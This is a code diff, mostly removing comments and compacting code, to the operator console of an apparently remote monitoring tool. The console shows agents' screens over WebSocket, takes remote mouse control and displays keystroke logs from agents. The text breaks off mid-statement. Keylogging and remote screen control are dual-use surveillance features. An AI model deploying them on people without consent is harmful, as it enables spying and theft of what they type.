@@ -84,11 +84,9 @@
     </div>
 
     <script>
-        /* --- JAVASCRIPT --- */
-        // Usamos window.addEventListener para garantir que o DOM esteja pronto
-        window.addEventListener('DOMContentLoaded', () => {
-            
-            // Elementos do DOM
+        // --- JAVASCRIPT ---
+        // Tudo dentro de um único bloco de script no final do body
+        document.addEventListener('DOMContentLoaded', () => {
             const wsUrlEl = document.getElementById('wsUrl'),
                   tokenEl = document.getElementById('token'),
                   connectBtn = document.getElementById('connectBtn'),
@@ -117,7 +115,7 @@
                 decoding = false,
                 pendingFrame = null;
 
-            // Inicialização de LocalStorage
+            // Inicialização
             wsUrlEl.value = localStorage.getItem('em_ws') || '';
             tokenEl.value = localStorage.getItem('em_admin') || '';
             profileEl.value = localStorage.getItem('em_profile') || 'balanced';
@@ -137,7 +135,6 @@
                 return String(v).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;').replaceAll("'", '&#039;');
             }
 
-            // --- Funções de Keylog ---
             function addKeylog(key, down, ts) {
                 const entry = document.createElement('div');
                 entry.className = 'log-entry';
@@ -150,7 +147,6 @@
                 }
             }
 
-            // --- Gerenciamento de Agentes ---
             function renderAgents() {
                 agentsEl.innerHTML = agents.map(a => `
                     <div class="card">
@@ -166,11 +162,11 @@
                         <button onclick="endAccess('${a.id}')">Encerrar tudo</button>
                     </div>
                 `).join('');
-                
                 const s = agents.find(a => a.id === selectedAgentId);
                 controlBanner.className = 'control-banner' + (s?.controlActive ? ' active' : '');
             }
 
+            // Funções Globais para os botões
             window.requestAccess = id => send({ type: 'request_access', agentId: id });
             window.watchAgent = id => { selectedAgentId = id; send({ type: 'watch', agentId: id }); setProfile(id); };
             window.requestControl = id => { selectedAgentId = id; send({ type: 'watch', agentId: id }); setProfile(id); setTimeout(() => send({ type: 'request_control', agentId: id }), 80); };
@@ -187,16 +183,13 @@
             applyProfile.onclick = () => setProfile();
             document.getElementById('fullBtn').onclick = () => screenWrap.requestFullscreen?.();
 
-            // --- Conexão WebSocket ---
             connectBtn.onclick = () => {
                 const url = wsUrlEl.value.trim();
                 const token = tokenEl.value;
                 localStorage.setItem('em_ws', url);
                 localStorage.setItem('em_admin', token);
-                
                 if (ws) ws.close();
                 setStatus('Conectando...', 'wait');
-
                 try {
                     ws = new WebSocket(url);
                     ws.binaryType = 'arraybuffer';
@@ -204,36 +197,24 @@
                     setStatus('URL inválida', 'bad');
                     return;
                 }
-
                 ws.onopen = () => send({ type: 'admin_hello', token });
-                
                 ws.onmessage = async (ev) => {
                     if (typeof ev.data === 'string') {
                         let m;
                         try { m = JSON.parse(ev.data); } catch { return; }
-                        
                         if (m.type === 'error') { setStatus(m.message || 'Erro', 'bad'); return; }
                         if (m.type === 'admin_ready') { setStatus('Conectado', 'ok'); agents = m.agents || []; renderAgents(); return; }
                         if (m.type === 'agent_list') { agents = m.agents || []; renderAgents(); return; }
-                        
-                        // TRATAMENTO DO KEYLOG
-                        if (m.type === 'keylog') {
-                            addKeylog(m.key, m.down, m.ts);
-                            return;
-                        }
+                        if (m.type === 'keylog') { addKeylog(m.key, m.down, m.ts); return; }
                         return;
                     }
-                    
-                    // Dados Binários (Frames de vídeo)
                     bytesSecond += ev.data.byteLength || 0;
                     queueFrame(ev.data);
                 };
-
                 ws.onclose = () => setStatus('Desconectado', 'bad');
                 ws.onerror = () => setStatus('Erro de conexão', 'bad');
             };
 
-            // --- Renderização de Vídeo ---
             function queueFrame(buf) {
                 if (decoding) {
                     pendingFrame = buf;
@@ -258,7 +239,7 @@
                     fpsFrames++;
                     framesEl.textContent = 'Frames: ' + frames;
                 } catch (e) {
-                    console.error("Erro ao decodificar frame:", e);
+                    console.error(e);
                 } finally {
                     decoding = false;
                     if (pendingFrame) {
@@ -269,7 +250,6 @@
                 }
             }
 
-            // Loop de Métricas
             setInterval(() => {
                 const now = performance.now();
                 const fps = fpsFrames * 1000 / (now - lastFps);
@@ -280,7 +260,6 @@
                 lastFps = now;
             }, 1000);
 
-            // --- Controle Remoto ---
             function selectedControlActive() {
                 return !!agents.find(a => a.id === selectedAgentId && a.controlActive);
             }
@@ -323,6 +302,4 @@
 
             canvas.addEventListener('wheel', e => {
                 if (!selectedControlActive()) return;
-                e.preventDefault();
-                controlSend({ kind: 'wheel', delta: e.deltaY < 0 ? 120 : -120 });
-            }, { passive: false });
+                e.
